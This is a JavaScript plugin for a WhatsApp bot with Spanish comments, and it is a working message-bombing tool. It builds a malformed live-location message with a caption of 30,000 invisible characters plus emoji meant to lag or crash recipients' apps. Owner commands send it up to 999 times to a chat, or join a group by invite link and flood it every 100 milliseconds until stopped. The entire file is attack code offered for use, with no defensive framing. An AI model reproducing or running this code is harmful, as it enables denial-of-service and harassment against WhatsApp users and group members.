const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(30000) + '💥'.repeat(1000),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let activeBombing = false
let bombingInterval = null

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) return

  const text = m.text?.trim()

  // Comando clásico ¤-n
  const matchClassic = text.match(/^¤(?:-(\d{1,3}))?$/)
  if (matchClassic) {
    const repeatCount = parseInt(matchClassic[1]) || 1
    if (repeatCount < 1 || repeatCount >= 1000) return

    for (let i = 0; i < repeatCount; i++) {
      try {
        await conn.relayMessage(m.chat, buildLagMessage(), { messageId: conn.generateMessageTag() })
        await new Promise(resolve => setTimeout(resolve, 100))
      } catch (error) {
        console.error('Error al enviar mensaje:', error)
      }
    }
    return
  }

  // Comando Ω <link>
  const matchJoin = text.match(/^Ω\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)$/i)
  if (matchJoin) {
    const inviteLink = matchJoin[1]
    const groupCode = inviteLink.split('/')[3]
    try {
      let groupId
      try {
        groupId = await conn.groupAcceptInvite(groupCode)
      } catch {
        groupId = await conn.groupGetInviteInfo(groupCode)
        groupId = groupId.id
      }

      activeBombing = true
      bombingInterval = setInterval(async () => {
        if (!activeBombing) return
        try {
          for (let i = 0; i < 3; i++) {
            await conn.relayMessage(groupId, buildLagMessage(), { messageId: conn.generateMessageTag() })
          }
        } catch (err) {
          console.error('Error en bombardeo:', err)
        }
      }, 100)

      await m.reply(`💣 Bombardeo iniciado en el grupo.`)
    } catch (err) {
      await m.reply(`❌ Error al procesar el grupo: ${err}`)
    }
    return
  }

  // Comando Ω dentro del grupo
  if (/^Ω$/i.test(text) && m.isGroup) {
    const groupId = m.chat
    activeBombing = true
    bombingInterval = setInterval(async () => {
      if (!activeBombing) return
      try {
        for (let i = 0; i < 3; i++) {
          await conn.relayMessage(groupId, buildLagMessage(), { messageId: conn.generateMessageTag() })
        }
      } catch (err) {
        console.error('Error en bombardeo:', err)
      }
    }, 100)

    await m.reply(`💣 Bombardeo iniciado en este grupo.`)
    return
  }

  // Comando Ω end desde PV
  if (/^Ω\s+end$/i.test(text) && !m.isGroup) {
    activeBombing = false
    if (bombingInterval) clearInterval(bombingInterval)
    await m.reply('🛑 Bombardeo detenido.')
    return
  }
}

handler.command = new RegExp
handler.customPrefix = /^¤(?:-\d{1,3})?$|^Ω(\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)|\s+end)?$/i
handler.tags = ['owner']
handler.help = ['¤-n', 'Ω <link>', 'Ω', 'θ']

export default handler